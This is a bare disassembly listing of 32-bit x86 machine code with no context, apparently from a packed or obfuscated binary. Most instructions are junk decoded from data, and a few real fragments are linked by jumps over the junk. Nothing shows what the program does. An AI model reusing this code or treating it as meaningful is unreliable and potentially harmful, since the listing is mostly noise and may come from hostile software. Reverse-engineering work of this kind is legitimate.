  401953:	pop    esi
  401954:	add    BYTE PTR [ebx],0x50
  401957:	fwait
  401958:	push   eax
  401959:	dec    esp
  40195a:	pushf  
  40195b:	jo     0x4019c4
  40195d:	sbb    bh,0x26
  401960:	pop    edx
  401961:	in     al,0x8d
  401963:	mov    ebx,0x6ccb7c8a
  401968:	sub    al,0xa
  40196a:	xor    al,0xf0
  40196c:	mov    cl,0xac
  40196e:	lea    esi,[ecx+0x78]
  401971:	outs   dx,DWORD PTR ds:[esi]
  401972:	mov    BYTE PTR [eax],0xb7
  401975:	mov    al,0x10
  401977:	stos   BYTE PTR es:[edi],al
  401978:	into   
  401979:	adc    ch,ah
  40197b:	mov    es,WORD PTR [ebp+ecx*4+0x3b]
  40197f:	icebp  
  401980:	mov    ecx,0x4af5e7a8
  401985:	std    
  401986:	imul   ebp,DWORD PTR [edx+0x5],0x882f44c9
  40198d:	and    eax,0x87550727
  401992:	lods   al,BYTE PTR ds:[esi]
  401993:	aas    
  401994:	sbb    edi,DWORD PTR [eax]
  401996:	cmc    
  401997:	add    bl,BYTE PTR [edx]
  401999:	adc    BYTE PTR [ecx+0x64],0xe0
  40199d:	push   ds
  40199e:	sub    ebp,DWORD PTR [ebp-0x5afdfbcb]
  4019a4:	cmp    bl,cl
  4019a6:	sub    ebx,edi
  4019a8:	sub    eax,DWORD PTR [esi-0x80]
  4019ab:	xor    eax,0x2dd66881
  4019b0:	imul   eax,DWORD PTR [edx-0x210dee9a],0xffffffd0
  4019b7:	ins    DWORD PTR es:[edi],dx
  4019b8:	cs xchg edx,eax
  4019ba:	shl    DWORD PTR ds:0xf17e3c6b,cl
  4019c0:	scas   al,BYTE PTR es:[edi]
  4019c1:	lds    edx,FWORD PTR [esi]
  4019c3:	jnp    0x40196c
  4019c5:	bound  edx,QWORD PTR ss:0xbd8020f7
  4019cc:	(bad)  
  4019cd:	xlat   BYTE PTR ds:[ebx]
  4019ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019cf:	xor    BYTE PTR [esi],bh
  4019d1:	or     bl,BYTE PTR [esi]
  4019d3:	mov    ah,0x27
  4019d5:	and    BYTE PTR [ebp+0x2f1986ea],bl
  4019db:	inc    BYTE PTR [ecx-0x786e3035]
  4019e1:	inc    ebx
  4019e2:	dec    esi
  4019e3:	xchg   edi,eax
  4019e4:	in     al,0x7
  4019e6:	jmp    0x4e4666f8
  4019eb:	push   esi
  4019ec:	lods   al,BYTE PTR ds:[esi]
  4019ed:	or     ebx,ecx
  4019ef:	pop    esp
  4019f0:	in     al,dx
  4019f1:	sbb    ah,ch
  4019f3:	enter  0xc623,0x64
  4019f7:	add    al,BYTE PTR cs:[ebp+0x2c]
  4019fb:	outs   dx,BYTE PTR ds:[esi]
  4019fc:	(bad)  
  4019fe:	cmp    eax,0xcd275e8a
  401a03:	cmc    
  401a04:	jp     0x401a1e
  401a06:	outs   dx,DWORD PTR ds:[esi]
  401a07:	and    ebp,DWORD PTR [ecx-0x77]
  401a0a:	or     ecx,DWORD PTR [edi-0x536a511d]
  401a10:	cmp    al,0x3
  401a12:	mov    dh,0xa4
  401a14:	std    
  401a15:	mov    ds:0xcdb3e282,al
  401a1a:	xchg   BYTE PTR [eax+0x148c3b84],ah
  401a20:	and    al,0xc0
  401a22:	and    al,0x55
  401a24:	rol    ah,1
  401a26:	adc    eax,0x44657af1
  401a2b:	(bad)  
  401a2d:	scas   eax,DWORD PTR es:[edi]
  401a2e:	adc    edi,DWORD PTR [esp+ecx*1-0x5]
  401a32:	imul   eax,DWORD PTR [edi-0x11],0x3e
  401a36:	jbe    0x401ab2
  401a38:	pop    esi
  401a39:	fst    DWORD PTR [edx]
  401a3b:	inc    ecx
  401a3c:	sbb    eax,DWORD PTR [edi-0x13d9e1c6]
  401a42:	stc    
  401a43:	adc    edi,DWORD PTR [ebx+0x44aa469c]
  401a49:	pop    eax
  401a4a:	mov    edx,0x321b66fa
  401a4f:	cmc    
  401a50:	sbb    eax,0x81615bd6
  401a55:	push   edi
  401a56:	inc    ebx
  401a57:	or     eax,0x124881ec
  401a5c:	int3   
  401a5d:	xchg   edi,eax
  401a5e:	inc    ebp
  401a5f:	mov    ebx,0x458b3372
  401a64:	or     BYTE PTR [ecx+0x43474f25],al
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	add    BYTE PTR [eax],al
  401a6e:	add    BYTE PTR [ebx+0x43474f0d],cl
  401a74:	add    BYTE PTR [ecx-0x77],al
  401a77:	or     eax,0x43474f
  401a7c:	cmp    DWORD PTR ds:0x43474f,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x43474f,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x43474f
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x43474f,ecx
  401aae:	cmp    DWORD PTR ds:0x43474f,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x2b48485e
  401ae8:	scas   al,BYTE PTR es:[edi]
  401ae9:	mov    esi,0x7e7e0452
  401aee:	mov    ch,0x7f
  401af0:	jle    0x401b70
  401af2:	mov    BYTE PTR [esi+0x6cc5746a],dl
  401af8:	xor    edx,ebx
  401afa:	sbb    eax,0x5a9fc0bb
  401aff:	fldcw  WORD PTR [ebp-0x15]
  401b02:	inc    eax
  401b03:	xchg   esi,eax
  401b04:	call   FWORD PTR [eax+eax*2]
  401b07:	or     al,0x57
  401b09:	pop    edi
  401b0a:	idiv   eax
  401b0c:	ins    DWORD PTR es:[edi],dx
  401b0d:	push   ebp
  401b0e:	push   0x1b
  401b10:	aas    
  401b11:	jp     0x401b4d
  401b13:	adc    BYTE PTR [ecx],al
  401b15:	stos   BYTE PTR es:[edi],al
  401b16:	or     DWORD PTR cs:[ebx+0x30],edx
  401b1a:	fsubr  QWORD PTR [edi-0x46]
  401b1d:	out    0x8c,al
  401b1f:	mov    ch,0xbe
  401b21:	scas   al,BYTE PTR es:[edi]
  401b22:	daa    
  401b23:	fbld   TBYTE PTR [eax]
  401b25:	pop    es
  401b26:	xor    BYTE PTR [edi],al
  401b28:	out    0x40,eax
  401b2a:	jbe    0x401b17
  401b2c:	xlat   BYTE PTR ds:[ebx]
  401b2d:	dec    edx
  401b2e:	sar    ebx,0x7c
  401b31:	or     BYTE PTR [eax],dl
  401b33:	loop   0x401b30
  401b35:	xchg   ebx,eax
  401b36:	cwde   
  401b37:	fs out 0x89,al
  401b3a:	dec    edx
  401b3b:	adc    eax,0xeaeb0abb
  401b40:	jne    0x401b5a
  401b42:	inc    ecx
  401b43:	mov    esp,0xa896d81
  401b48:	push   cs
  401b49:	jnp    0x401b5e
  401b4b:	mov    bl,0x5
  401b4d:	stc    
  401b4e:	(bad)  
  401b50:	sub    eax,0xc8a67174
  401b55:	stos   BYTE PTR es:[edi],al
  401b56:	push   ebp
  401b57:	sbb    BYTE PTR [ecx-0x9],0xb1
  401b5b:	mov    edx,0xe1de241f
  401b60:	ret    0xbca9
  401b63:	lds    esp,FWORD PTR [esi-0x257b8ce5]
  401b69:	mov    eax,0xc3d4fac6
  401b6e:	(bad)  
  401b6f:	rol    DWORD PTR [eax+0x7d],1
  401b72:	fwait
  401b73:	jo     0x401b68
  401b75:	mov    dl,0x24
  401b77:	jmp    0x4afbda62
  401b7c:	clc    
  401b7d:	shl    BYTE PTR [edi],0x2e
  401b80:	clc    
  401b81:	adc    eax,0xba247b04
  401b86:	(bad)
  401b89:	xchg   edi,eax
  401b8a:	mov    esi,0x83e33ca1
  401b8f:	(bad)  
  401b90:	in     eax,0x58
  401b92:	mov    bl,0xc2
  401b94:	std    
  401b95:	in     al,0xf6
  401b97:	jle    0x401b3d
  401b99:	mov    ch,0x5c
  401b9b:	imul   esi,DWORD PTR [ecx],0xfad75a8e
  401ba1:	js     0x401b91
  401ba3:	mov    ebp,0xb92421fd
  401ba8:	add    DWORD PTR [edx-0x34072b3e],ebp
  401bae:	sti    
  401baf:	(bad)  
  401bb0:	fwait
  401bb1:	push   edx
  401bb2:	mov    edi,0x9050337b
  401bb7:	test   al,0x86
  401bb9:	jo     0x401b42
  401bbb:	sti    
  401bbc:	pop    edx
  401bbd:	bound  edi,QWORD PTR [eax+0x2fdd3d46]
  401bc3:	push   0x1138b31b
  401bc8:	push   0x5292b3b3
  401bcd:	pusha  
  401bce:	sub    al,0xdc
  401bd0:	test   eax,0xf004c49a
  401bd5:	push   cs
  401bd6:	ret    0x397e
  401bd9:	push   esi
  401bda:	pop    ecx
  401bdb:	add    BYTE PTR [edi],0xc2
  401bde:	icebp  
  401bdf:	mov    dh,ah
  401be1:	xor    DWORD PTR [eax],edi
  401be3:	shl    DWORD PTR [ecx-0x35],cl
  401be6:	push   0x30
  401be8:	add    ecx,ebp
  401bea:	mov    bh,BYTE PTR [ebx]
  401bec:	movs   DWORD PTR es:[di],DWORD PTR ss:[si]
  401bef:	or     ah,ah
  401bf1:	mov    bl,0x63
  401bf3:	xchg   BYTE PTR [eax],al
  401bf5:	pop    edi
  401bf6:	or     BYTE PTR [edx],dl
  401bf8:	or     ecx,ebp
  401bfa:	test   al,0xf4
  401bfc:	sub    al,0xfc
  401bfe:	push   esp
  401bff:	stos   BYTE PTR es:[edi],al
  401c00:	int    0xd0
  401c02:	mov    fs,WORD PTR [ebp+edi*1+0x8]
  401c06:	dec    ecx
  401c07:	xor    BYTE PTR [ebx-0x3f],al
  401c0a:	mov    eax,0x4549f10d
  401c0f:	and    BYTE PTR [ebp-0x8cbf47d],al
  401c15:	sub    BYTE PTR ds:0xffe737c9,ah
  401c1b:	cmp    bl,BYTE PTR [ecx+0x20]
  401c1e:	lods   eax,DWORD PTR ds:[esi]
  401c1f:	mov    cl,0x64
  401c21:	enter  0xf215,0x3c
  401c25:	lods   eax,DWORD PTR ds:[esi]
  401c26:	(bad)  
  401c27:	mov    bh,0x22
  401c29:	dec    eax
  401c2a:	or     eax,0x6f0cf6a5
  401c2f:	outs   dx,BYTE PTR ds:[esi]
  401c30:	sub    eax,0x5312d4f
  401c35:	sub    ch,BYTE PTR [ecx+0x67101cd5]
  401c3b:	xor    eax,0xdf0424b
  401c40:	dec    eax
  401c41:	and    ecx,edi
  401c43:	in     al,0xd9
  401c45:	jg     0x401c12
  401c47:	sub    dh,BYTE PTR [ebx+0x3331355e]
  401c4d:	jnp    0x401c1a
  401c4f:	popf   
  401c50:	xchg   BYTE PTR [edx+0xc],bh
  401c53:	cmp    al,0xc
  401c55:	mov    dh,dl
  401c57:	sbb    DWORD PTR [eax+edi*4],esi
  401c5a:	push   ebx
  401c5b:	sub    ch,BYTE PTR [ebx]
  401c5d:	mov    bh,0xea
  401c5f:	gs hlt 
  401c61:	addr16 inc esi
  401c63:	and    edi,esp
  401c65:	sar    BYTE PTR [ebx],cl
  401c67:	inc    ebp
  401c68:	jmp    0x401cd6
  401c6a:	inc    esi
  401c6b:	out    dx,al
  401c6c:	jmp    0x401c94
  401c6e:	xor    al,0x9c
  401c70:	in     al,dx
  401c71:	out    0xb5,al
  401c73:	icebp  
  401c74:	push   ebx
  401c75:	lods   eax,DWORD PTR ds:[esi]
  401c76:	mov    al,0x4e
  401c78:	dec    ebx
  401c79:	imul   ebp,DWORD PTR [edi],0xffffffd2
  401c7c:	fadd   DWORD PTR [esi]
  401c7e:	cmp    DWORD PTR [ebx+eiz*4],edi
  401c81:	(bad)  
  401c82:	dec    eax
  401c83:	or     ecx,esi
  401c85:	mov    al,0xe0
  401c87:	int3   
  401c88:	repz or esi,ecx
  401c8b:	cmc    
  401c8c:	shl    ecx,0xbd
  401c8f:	dec    ebp
  401c90:	xchg   DWORD PTR [ecx+0x6518cb66],esp
  401c96:	push   edx
  401c97:	add    eax,ecx
  401c99:	adc    bl,ch
  401c9b:	add    eax,0x86ffddd1
  401ca0:	push   ss
  401ca1:	inc    edi
  401ca2:	addr16 cwde 
  401ca4:	shl    DWORD PTR [esi+0x5d],0x98
  401ca8:	dec    edx
  401ca9:	mov    eax,ds:0x414bd2
  401cae:	mov    eax,DWORD PTR [eax]
  401cb0:	mov    cx,WORD PTR [ebp-0x4]
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	in     al,dx
  401ccb:	(bad)  
  401ccc:	mov    bl,0x40
  401cce:	mov    DWORD PTR [esi],eax
  401cd0:	jle    0x401d50
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	ss inc edi
  401cd8:	inc    edx
  401cd9:	adc    edx,DWORD PTR [edx]
  401cdb:	push   cs
  401cdc:	inc    ebp
  401cdd:	test   eax,0xf1b3af32
  401ce2:	ins    BYTE PTR es:[edi],dx
  401ce3:	mov    esp,0x392691df
  401ce8:	dec    eax
  401ce9:	das    
  401cea:	mov    ebp,0xfb7453c6
  401cef:	or     ah,BYTE PTR ds:0x3bb6b697
  401cf5:	mov    ebx,0x8a903336
  401cfa:	outs   dx,DWORD PTR ds:[esi]
  401cfb:	mov    edx,DWORD PTR [esi+0x19]
  401cfe:	or     BYTE PTR [edx-0x67],dh
  401d01:	mov    WORD PTR ds:0x4c73c5fa,cs
  401d07:	(bad)  
  401d08:	jmp    0x4d67:0xf8ef9a9a
  401d0f:	lods   eax,DWORD PTR ds:[esi]
  401d10:	mov    eax,ds:0x810cd444
  401d15:	and    ch,BYTE PTR [eax]
  401d17:	and    DWORD PTR [esi],edi
  401d19:	dec    edi
  401d1a:	test   DWORD PTR [ebp+0x24],ecx
  401d1d:	int3   
  401d1e:	sbb    al,0x58
  401d20:	imul   edx,ebx,0xea1e3cdc
  401d26:	dec    ecx
  401d27:	fisttp WORD PTR [eax]
  401d29:	fnstsw WORD PTR [esi-0x40b4f9d0]
  401d2f:	mov    dl,0xff
  401d31:	js     0x401cf4
  401d33:	outs   dx,BYTE PTR ds:[esi]
  401d34:	sub    eax,0x5ffc5faf
  401d39:	inc    edx
  401d3a:	dec    ecx
  401d3b:	add    DWORD PTR [eax+0xc],edi
  401d3e:	stos   DWORD PTR es:[edi],eax
  401d3f:	push   ds
  401d40:	out    0xef,al
  401d42:	scas   al,BYTE PTR es:[edi]
  401d43:	ds test ch,0xfc
  401d47:	clc    
  401d48:	pop    edi
  401d49:	jnp    0x401d58
  401d4b:	add    al,0x4d
  401d4d:	mov    eax,0xa81f4f5c
  401d52:	inc    edx
  401d53:	enter  0xdfea,0x3d
  401d57:	dec    ecx
  401d58:	rol    BYTE PTR [edi+ebp*2],1
  401d5b:	sub    al,0x97
  401d5d:	xlat   BYTE PTR ds:[ebx]
  401d5e:	dec    ebp
  401d5f:	push   0xb5069037
  401d64:	inc    esp
  401d65:	and    BYTE PTR [ebx-0x80],ch
  401d68:	push   ds
  401d69:	inc    ecx
  401d6a:	mov    ebx,0x25cc4e6c
  401d6f:	in     eax,0x2c
  401d71:	cld    
  401d72:	ds mov edx,0xa9b836bf
  401d78:	xchg   esi,eax
  401d79:	inc    edx
  401d7a:	add    eax,0xf1e00f9a
  401d7f:	(bad)  
  401d80:	into   
  401d81:	cli    
  401d82:	push   ss
  401d83:	mov    esp,0xb795c9dd
  401d88:	and    DWORD PTR [esi],esp
  401d8a:	mov    eax,0xa7b1265a
  401d8f:	jecxz  0x401d63
  401d91:	push   ds
  401d92:	sbb    BYTE PTR [edx-0x32],bh
  401d95:	dec    esp
  401d96:	xchg   edi,eax
  401d97:	dec    edi
  401d98:	jbe    0x401d73
  401d9a:	cld    
  401d9b:	and    ch,dh
  401d9d:	ror    DWORD PTR [ebx],1
  401d9f:	mov    dh,0xf4
  401da1:	ins    DWORD PTR es:[edi],dx
  401da2:	ret    
  401da3:	(bad)  
  401da4:	ficom  WORD PTR [edi+0x2b]
  401da7:	sar    BYTE PTR [edx+0x6b],cl
  401daa:	pop    ecx
  401dab:	or     BYTE PTR [ebp+0x23],dl
  401dae:	repz mov ah,0xd1
  401db1:	push   ebp
  401db2:	in     al,dx
  401db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401db4:	mov    ebx,0x5b7da67
  401db9:	retf   0x3898
  401dbc:	or     BYTE PTR [ebp+ebx*1-0x637557f5],0x9b
  401dc4:	sbb    DWORD PTR [eax+0x4b139962],0xa1dfc009
  401dce:	inc    ecx
  401dcf:	sbb    al,0x80
  401dd1:	repz test DWORD PTR [edx],esi
  401dd4:	fwait
  401dd5:	or     BYTE PTR [eax+0x55cac71a],ah
  401ddb:	mov    edi,0x26f8706c
  401de0:	aaa    
  401de1:	call   0x547c0eb6
  401de6:	ins    DWORD PTR es:[edi],dx
  401de7:	inc    eax
  401de8:	xor    eax,0x4e0b532a
  401ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dee:	dec    edi
  401def:	stc    
  401df0:	outs   dx,DWORD PTR ds:[esi]
  401df1:	push   esi
  401df2:	nop
  401df3:	mov    ecx,DWORD PTR [eax]
  401df5:	shl    DWORD PTR [edi+eax*4+0x69],0x51
  401dfa:	dec    edx
  401dfb:	out    dx,al
  401dfc:	add    eax,0x89ed93df
  401e01:	shl    cl,0xc9
  401e04:	lods   al,BYTE PTR ds:[esi]
  401e05:	or     eax,ebp
  401e07:	pop    edi
  401e08:	ss pop ebx
  401e0a:	sub    dh,al
  401e0c:	aaa    
  401e0d:	retf   0xe971
  401e10:	sub    BYTE PTR [ebp+0x46cd04c3],cl
  401e16:	jp     0x401e5d
  401e18:	rol    dh,1
  401e1a:	fst    QWORD PTR [eax+0x2f]
  401e1d:	push   cs
  401e1e:	lahf   
  401e1f:	or     edx,DWORD PTR [ebx+0x53d2d07a]
  401e25:	jnp    0x401e31
  401e27:	fidiv  DWORD PTR [ebx+0x42]
  401e2a:	mov    ebp,0xcb6b9c39
  401e2f:	dec    ecx
  401e30:	sbb    BYTE PTR [edx-0x5043c8a],bl
  401e36:	xchg   edx,eax
  401e37:	adc    al,0x5
  401e39:	in     al,0x2
  401e3b:	ins    DWORD PTR es:[edi],dx
  401e3c:	in     al,dx
  401e3d:	push   edi
  401e3e:	or     ch,BYTE PTR [ecx]
  401e40:	and    eax,0xe9f1023b
  401e45:	(bad)  
  401e47:	imul   eax,edi,0x1d
  401e4a:	mov    al,0xf
  401e4c:	dec    ecx
  401e4d:	push   es
  401e4e:	add    ch,dh
  401e50:	cmp    eax,0xd4c01449
  401e55:	mov    eax,0x8f63b848
  401e5a:	jge    0x401e2b
  401e5c:	jno    0x401e21
  401e5e:	stc    
  401e5f:	mov    edx,0x7110e136
  401e64:	jg     0x401eaa
  401e66:	jmp    0x401edb
  401e68:	xchg   edi,eax
  401e69:	xlat   BYTE PTR ds:[ebx]
  401e6a:	mov    ds:0xbeab21ae,eax
  401e6f:	aam    0xa6
  401e71:	fstp   TBYTE PTR [edx+0x1d]
  401e74:	clc    
  401e75:	loop   0x401ef0
  401e77:	xchg   DWORD PTR [eax-0x1d],esi
  401e7a:	test   BYTE PTR [ecx],dl
  401e7c:	lods   al,BYTE PTR ds:[esi]
  401e7d:	adc    ch,BYTE PTR [ebx+0x13a9c2d1]
  401e83:	pop    esi
  401e84:	push   cs
  401e85:	dec    ebx
  401e86:	dec    esi
  401e87:	mov    ecx,0x8de357fc
  401e8c:	xor    DWORD PTR [ecx+0x458be84d],ecx
  401e92:	or     al,0x8b
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	bound  esp,QWORD PTR [edx+0x68]
  401eb2:	repnz rol BYTE PTR [eax],0x7e
  401eb6:	jle    0x401e6d
  401eb8:	jg     0x401f38
  401eba:	jle    0x401f29
  401ebc:	and    DWORD PTR [ebx],0xbd04b989
  401ec2:	jp     0x401f03
  401ec4:	call   DWORD PTR [eax-0x5e]
  401ec7:	icebp  
  401ec8:	xchg   esp,eax
  401ec9:	jnp    0x401f49
  401ecb:	out    dx,eax
  401ecc:	sbb    al,0x8e
  401ece:	mov    ecx,0x22266afa
  401ed3:	sbb    edi,DWORD PTR [esi-0x7e]
  401ed6:	xor    ebp,ebp
  401ed8:	cmc    
  401ed9:	ror    dh,0xb
  401edc:	push   ecx
  401edd:	xchg   DWORD PTR [edi-0x5efa652b],edi
  401ee3:	fcom   QWORD PTR ds:[eax+ecx*4+0x77]
  401ee8:	ja     0x401f1e
  401eea:	shl    dh,1
  401eec:	stos   BYTE PTR es:[edi],al
  401eed:	test   DWORD PTR [edi],edx
  401eef:	cdq    
  401ef0:	fwait
  401ef1:	repnz sti 
  401ef3:	mov    esp,0x9903ca8b
  401ef8:	leave  
  401ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401efa:	out    0xaa,al
  401efc:	xchg   ebx,eax
  401efd:	addr16 dec esp
  401eff:	add    eax,0x95a2a38b
  401f04:	clc    
  401f05:	push   0x21
  401f07:	mov    al,0xe6
  401f09:	mov    ah,0x37
  401f0b:	or     DWORD PTR [esi+0x43],edx
  401f0e:	sub    ebp,esi
  401f10:	fwait
  401f11:	test   eax,0xeb19c947
  401f16:	(bad)  
  401f17:	push   ebx
  401f18:	xor    DWORD PTR [ebx-0x4a0acb],esp
  401f1e:	push   0x4f93f255
  401f23:	cmp    edx,ecx
  401f25:	sbb    BYTE PTR [esp+ebp*4],0x54
  401f29:	mov    edi,DWORD PTR [edi-0x15cb740a]
  401f2f:	clc    
  401f30:	dec    eax
  401f31:	test   DWORD PTR [ecx+0xd],0xda5e4e7d
  401f38:	sub    BYTE PTR [edx+0x49],0x16
  401f3c:	pop    ebx
  401f3d:	call   0x1902:0x29961737
  401f44:	jmp    0xda32:0xb1d880c5
  401f4b:	mov    dh,ah
  401f4d:	add    eax,edx
  401f4f:	mov    bl,0xb4
  401f51:	pop    ecx
  401f52:	int3   
  401f53:	imul   ebx,DWORD PTR es:[ecx+0x7f],0x6d1c6e7f
  401f5b:	sub    esi,DWORD PTR [edi+0x4c55587a]
  401f61:	pop    esp
  401f62:	js     0x401fe0
  401f64:	push   ds
  401f65:	sbb    BYTE PTR [ecx],bh
  401f67:	hlt    
  401f68:	idiv   BYTE PTR [ecx]
  401f6a:	jge    0x401f07
  401f6c:	add    cl,BYTE PTR [ebx+0x5a47e3cf]
  401f72:	rol    BYTE PTR [edx-0x6e],0x1b
  401f76:	sahf   
  401f77:	test   eax,0xfe4213b1
  401f7c:	repz sar BYTE PTR [edx+0x4be27787],1
  401f83:	js     0x401f9e
  401f85:	pop    eax
  401f86:	mov    ds:0xaecf6c13,al
  401f8b:	and    al,0xbc
  401f8d:	setg   BYTE PTR [esi-0x30]
  401f91:	sbb    BYTE PTR [ebx-0x66],0x8e
  401f95:	push   ecx
  401f96:	gs sub al,0x11
  401f99:	adc    BYTE PTR [edx+0x77a24d69],bl
  401f9f:	xchg   BYTE PTR [eax-0x1fd8823d],ah
  401fa5:	xchg   ebx,eax
  401fa6:	mov    gs,WORD PTR [eax-0x4de93702]
  401fac:	stos   BYTE PTR es:[edi],al
  401fad:	je     0x401f33
  401faf:	xchg   edi,eax
  401fb0:	(bad)  
  401fb1:	fstp   DWORD PTR [edx+0x9]
  401fb4:	sub    DWORD PTR [esi+0x6142272a],ebx
  401fba:	es inc esi
  401fbc:	gs jbe 0x40203d
  401fbf:	dec    eax
  401fc0:	and    al,dl
  401fc2:	stc    
  401fc3:	pop    esi
  401fc4:	pop    ds
  401fc5:	inc    eax
  401fc6:	xchg   edi,eax
  401fc7:	add    al,0xd5
  401fc9:	popf   
  401fca:	gs je  0x402008
  401fcd:	dec    ebx
  401fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fcf:	bound  ebx,QWORD PTR [edi]
  401fd1:	paddd  mm3,QWORD PTR [ecx-0x65101e31]
  401fd8:	inc    esp
  401fd9:	mov    DWORD PTR ds:[edx-0x43f8fa44],edx
  401fe0:	adc    al,bh
  401fe2:	in     eax,dx
  401fe3:	push   cs
  401fe4:	jb     0x401fce
  401fe6:	outs   dx,BYTE PTR cs:[esi]
  401fe8:	add    dl,BYTE PTR [ebx-0x44]
  401feb:	stos   BYTE PTR es:[edi],al
  401fec:	mov    bl,0xd1
  401fee:	iret   
  401fef:	mov    cl,0x51
  401ff1:	push   eax
  401ff2:	adc    bl,BYTE PTR [ecx+0x5688f18a]
  401ff8:	icebp  
  401ff9:	sbb    BYTE PTR [ecx],0x3f
  401ffc:	repz dec ebx
  401ffe:	adc    BYTE PTR [esi],bh
  402000:	mov    eax,0xbfb70077
  402005:	mov    al,0x4b
  402007:	dec    edx
  402008:	stc    
  402009:	sar    ch,1
  40200b:	mov    dl,0x7a
  40200d:	mov    al,0x5b
  40200f:	or     al,0x9f
  402011:	pop    es
  402012:	pop    esi
  402013:	cwde   
  402014:	pop    edi
  402015:	or     BYTE PTR [ecx+0x31],0xb6
  402019:	sub    eax,0xa02b35b7
  40201e:	push   eax
  40201f:	xchg   ah,bl
  402021:	xor    eax,DWORD PTR [esi]
  402023:	mov    DWORD PTR [esi],eax
  402025:	inc    edx
  402026:	adc    bl,BYTE PTR [eax]
  402028:	mov    edx,0x2b6ef41d
  40202d:	outs   dx,DWORD PTR ds:[esi]
  40202e:	gs inc ebx
  402030:	lods   al,BYTE PTR ds:[esi]
  402031:	fwait
  402032:	pusha  
  402033:	(bad)  
  402035:	cdq    
  402036:	adc    al,0xb0
  402038:	and    bl,bh
  40203a:	jg     0x402053
  40203c:	sbb    eax,0x9e6e4d2
  402041:	sub    al,0x4f
  402043:	les    ebp,FWORD PTR [ecx+0x42]
  402046:	test   DWORD PTR [esi],ecx
  402048:	pop    edx
  402049:	out    dx,al
  40204a:	sbb    al,0x60
  40204c:	inc    edi
  40204d:	cmp    DWORD PTR [edx+0x4d944249],edx
  402053:	mov    ds:0x1e0919c3,eax
  402058:	cmp    bh,BYTE PTR [ebx]
  40205a:	(bad)  [edi+0x798c2b88]
  402060:	sbb    al,0x64
  402062:	push   0x2
  402064:	push   ss
  402065:	popf   
  402066:	jno    0x401fe9
  402068:	adc    eax,0xd57e9330
  40206d:	das    
  40206e:	fisub  WORD PTR [ecx]
  402070:	mov    ecx,esi
  402072:	mov    ax,WORD PTR [ebp-0x4]
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    esp,ebx
  4020a2:	fxam   
  4020a4:	adc    DWORD PTR [edi+0x2],edi
  4020a7:	jle    0x402127
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	imul   BYTE PTR [edx+0x72]
  4020b0:	sub    dl,0x78
  4020b3:	push   ss
  4020b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b5:	or     BYTE PTR [ecx],0x3f
  4020b8:	int    0x99
  4020ba:	idiv   BYTE PTR [edi-0x309f958e]
  4020c0:	mov    edi,DWORD PTR [edi+ecx*1-0x39980fc5]
  4020c7:	and    al,0xc9
  4020c9:	adc    al,BYTE PTR [bp+si-0x7cd9]
  4020ce:	jmp    0x98e826be
  4020d3:	(bad)  
  4020d4:	xlat   BYTE PTR ds:[ebx]
  4020d5:	lock fimul DWORD PTR [eax-0x236ebe4c]
  4020dc:	inc    esi
  4020dd:	jle    0x402095
  4020df:	call   0x3ced:0x3b85d5af
  4020e6:	fistp  WORD PTR [ecx+0x3f]
  4020e9:	or     ebp,edi
  4020eb:	imul   ecx,DWORD PTR [eax+0xb],0xb
  4020ef:	pop    esi
  4020f0:	fmul   QWORD PTR [edi+0x76]
  4020f3:	dec    esp
  4020f4:	dec    ecx
  4020f5:	and    bl,BYTE PTR [eax]
  4020f7:	outs   dx,BYTE PTR ds:[esi]
  4020f8:	jg     0x402172
  4020fa:	mov    dh,0x2d
  4020fc:	stc    
  4020fd:	xchg   edx,eax
  4020fe:	mov    ecx,0x2e11890d
  402103:	dec    esi
  402104:	lea    eax,[ebp+0x7]
  402107:	rol    dl,cl
  402109:	cli    
  40210a:	pop    esp
  40210b:	push   ebx
